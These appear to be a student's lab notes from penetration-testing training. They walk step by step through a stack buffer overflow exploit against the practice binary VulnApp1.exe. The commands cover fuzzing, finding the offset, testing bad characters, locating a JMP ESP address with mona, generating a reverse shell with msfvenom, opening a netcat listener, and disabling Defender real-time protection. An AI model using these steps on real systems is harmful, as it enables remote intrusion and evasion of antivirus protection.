
Steps:
    1. Identify buffer overlow opportunity
        - Start VulnApp1.exe
        - Start Immunity Debugger and attach to VulnApp1 process
            Downloaded Immunity from here:
                https://github.com/kbandla/ImmunityDebugger/releases/tag/1.85
        - Run `python -c "print(\"A\" * 10000)" | nc 172.29.208.1 7001`
        - Registers ECX, EDX, EBX, EBP, ESI, EDI, EIP are all overidden
            by the buffer overflow.
            And register ESP appears to point to somewhere in the
            malicious buffer.
    2. Identified offset that override EIP and that ESP points to
        `msf-pattern_create -l 10000 | nc 172.29.208.1 7001`
        EIP is overridden at offset 2288
            `msf-pattern_offset -l 10000 -q 33794332`
                => Exact match at offset 2288
        ESP points to offset 2300 and ends at 4092
            `msf-pattern_offset -l 10000 -q 6Cy7`
                => Exact match at offset 2300
            `msf-pattern_offset -l 10000 -q Fg4F`
                => Exact match at offset 4092
                    'Fg4F' was found in the bottom-right pane of the
                    CPU window. According to the PWK pdf, this pane
                    represents "the stack and its content".
    3. Run `python2 test-chars.py` and find that "\x00" is a bad character
        `buffer += "B" * 4` has to be added right before test characters;
        otherwise, the "\x00" bad character will be missed
    4. Find "JMP ESP" instruction at address 148010CF
        Steps:
            1. Install 'mona' in Immunity Debugger
                Installation instructions here:
                    https://github.com/corelan/mona
            2. Run `!mona modules` and find that "VulnApp1.exe" is the
                only module compiled without SafeSEH and ASLR
            3. Open `msf-nasm_shell` and run `JMP ESP`
                This will return 'FFE4'
            4. Run `!mona find -s "\xff\xe4" -m "VulnApp1.exe"`
                This will return '148010CF'
        * This value does not appear to be stable between runs
    5. Initiate shell listener
        `sudo rlwrap nc -lnvp 80`
    6. Turn off "Real-time protection" in "Virus & threat protection settings"
    7. Run exploit `python2 exploit.py`
        Reverse shell code generated by:
            `msfvenom -p windows/shell_reverse_tcp LHOST=172.29.208.12 LPORT=80 -f py -b '\x00'`
        Had to add a nop sled in order for the shell to work


